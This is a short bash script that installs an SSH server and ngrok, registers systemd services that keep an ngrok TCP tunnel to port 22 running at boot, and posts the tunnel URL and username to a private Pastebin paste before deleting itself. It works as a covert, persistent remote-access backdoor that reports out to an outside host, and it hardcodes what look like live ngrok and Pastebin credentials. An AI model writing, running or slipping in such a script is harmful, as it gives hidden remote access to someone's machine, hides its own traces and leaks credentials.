#!/bin/bash
sudo apt-get install openssh-server -y
sudo systemctl enable --now ssh.service
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
ngrok config add-authtoken 2ZO7zVeGuzxjihaS2Ey0aqqrKAn_dGdY26hmspbhARftJU8x


# Run whoami and store the result in the variable 'user'
user=$(whoami)

# Create the ngrok.service file
sudo touch /etc/systemd/system/ngrok.service

# Write the specified content into the ngrok.service file
sudo bash -c 'cat > /etc/systemd/system/ngrok.service << EOF
[Unit]
Description=ngrok TCP 22
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/local/bin/ngrok tcp 22
Restart=always
User='$user'
Group='$user'

[Install]
WantedBy=multi-user.target
EOF'

# Create the rips.service file
content="[Unit]
Description=Send ngrok tunnel URL to Pastebin

[Service]
ExecStart=/bin/bash -c \"sleep 60 && curl http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | xargs -I {} curl -X POST https://pastebin.com/api/api_post.php -d 'api_option=paste&api_dev_key=mtsSlIc_1qj4X5b2462VjMnZIvwG6G_W&api_user_key=47ffc4d9f3a240d311847f86c98c2f53&api_paste_code={}\nUsername:$user&api_paste_private=2&api_paste_name=Just Another Joke'\" 

[Install]
WantedBy=multi-user.target"

touch rips.service
echo "$content" > rips.service
sudo cp rips.service /etc/systemd/system/
rm rips.service



sudo systemctl daemon-reload
sudo systemctl enable ngrok.service
sudo systemctl enable rips.service

sudo rm remote.sh
